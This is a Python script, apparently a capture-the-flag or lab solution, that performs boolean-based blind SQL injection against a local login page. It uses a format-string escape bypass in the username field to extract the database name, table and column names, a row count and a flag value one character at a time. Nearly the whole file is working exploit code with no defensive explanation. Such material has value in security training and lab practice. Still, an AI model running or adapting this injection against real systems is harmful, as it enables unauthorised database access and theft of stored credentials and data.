#coding:utf-8

import requests
import string

def boom():
    url = r'http://127.0.0.1:801/sqlinject/geishihuasrc.php'
    s = requests.session()
    dic = string.digits + string.letters + "!@#$%^&*()_+{}-="
    right = 'password error!'
    error = 'username error!'

    lens = 0
    i = 0
    while True:
        payload = "admin%1$\\' or " + "length(database())>" + str(i) + "#"
        data={'username':payload,'password':1}
        r = s.post(url,data=data).content
        if error in r:
            lens=i
            break
        i+=1
        pass
    print("[+]length(database()): %d" %(lens))
# 爆破库名长度
    strs=''
    for i in range(lens+1):
        for c in dic:
            payload = "admin%1$\\' or " + "ascii(substr(database()," + str(i) +",1))=" + str(ord(c)) + "#"
            data = {'username':payload,'password':1}
            r = s.post(url,data=data).content
# check 返回内容
            if right in r:
                strs = strs + c
                print strs
                break
        pass
    pass
    print("[+]database():%s" %(strs))
#爆破库名内容
    lens=0
    i = 1
    while True:
        payload = "admin%1$\\' or " + "(select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)>" + str(i) + "#"
        data = {'username':payload,'password':1}
        r = s.post(url,data=data).content
        if error in r:
            lens = i
            break
        i+=1
        pass
    print("[+]length(table): %d" %(lens))
#爆破表长度
    strs=''
    for i in range(lens+1):
        for c in dic:
            # substr(string,字符起始位置start,字符数量)
            payload = "admin%1$\\' or " + "ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1)," + str(i) +",1))=" + str(ord(c)) + "#"
            data = {'username':payload,'password':1}
            r = s.post(url,data=data).content
            if right in r:
                strs = strs + c
                print strs
                break
        pass
    pass
    print("[+]table_name:%s" %(strs))
    tablename = '0x' + strs.encode('hex')
    table_name = strs
#爆破表内容
    lens=0
    i = 0
    while True:
        payload = "admin%1$\\' or " + "(select length(column_name) from information_schema.columns where table_name = " + str(tablename) + " limit 0,1)>" + str(i) + "#"
        data = {'username':payload,'password':1}
        r = s.post(url,data=data).content
        if error in r:
            lens = i
            break
        i+=1
        pass
    print("[+]length(column): %d" %(lens))

    strs=''
    for i in range(lens+1):
        for c in dic:
            payload = "admin%1$\\' or " + "ascii(substr((select column_name from information_schema.columns where table_name = " + str(tablename) +" limit 0,1)," + str(i) + ",1))=" + str(ord(c)) + "#"
            data = {'username':payload,'password':1}
            r = s.post(url,data=data).content
            if right in r:
                strs = strs + c
                print strs
                break
        pass
    pass
    print("[+]column_name:%s" %(strs))
    column_name = strs

    num=0
    i = 0
    while True:
        payload = "admin%1$\\' or " + "(select count(*) from " + table_name + ")>" + str(i) + "#"
        data = {'username':payload,'password':1}
        r = s.post(url,data=data).content
        if error in r:
            num = i
            break
        i+=1
        pass
    print("[+]number(column): %d" %(num))

    lens=0
    i = 0
    while True:
        payload = "admin%1$\\' or " + "(select length(" + column_name + ") from " + table_name + " limit 0,1)>" + str(i) + "#"
        data = {'username':payload,'password':1}
        r = s.post(url,data=data).content
        if error in r:
            lens = i
            break
        i+=1
        pass
    print("[+]length(value): %d" %(lens))

    i=1    
    strs=''
    for i in range(lens+1):
        for c in dic:
            payload = "admin%1$\\' or ascii(substr((select flag from flag limit 0,1)," + str(i) + ",1))=" + str(ord(c)) + "#"
            data = {'username':payload,'password':'1'}
            r = s.post(url,data=data).content
            if right in r:
                strs = strs + c
                print strs
                break
        pass
    pass
    print("[+]flag:%s" %(strs))

if __name__ == '__main__':
    boom()
    print 'Finish!'
    